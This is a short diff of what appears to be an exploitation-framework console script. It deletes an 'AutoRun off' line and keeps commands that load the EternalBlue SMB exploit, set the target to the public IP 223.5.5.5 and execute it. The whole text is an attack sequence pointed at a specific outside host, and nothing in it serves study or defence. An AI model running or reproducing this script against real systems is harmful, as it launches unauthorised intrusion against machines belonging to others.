@@ -1,4 +1,3 @@
-AutoRun off
 use EternalBlue
 setg TargetIP 223.5.5.5
 execute
